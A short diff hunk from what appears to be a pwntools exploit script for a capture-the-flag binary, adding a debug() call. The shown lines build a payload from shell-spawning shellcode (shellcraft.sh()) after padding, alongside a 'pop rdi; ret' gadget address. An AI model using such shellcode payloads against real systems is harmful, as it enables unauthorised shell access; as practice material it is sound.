@@ -54,7 +54,7 @@ prdi = 0x000000000000124b # pop rdi ; ret
 offset = 0
 payload = 'A'*offset
 payload += asm(shellcraft.sh())
-
+debug()
 # ru('')
 sl(payload)
 
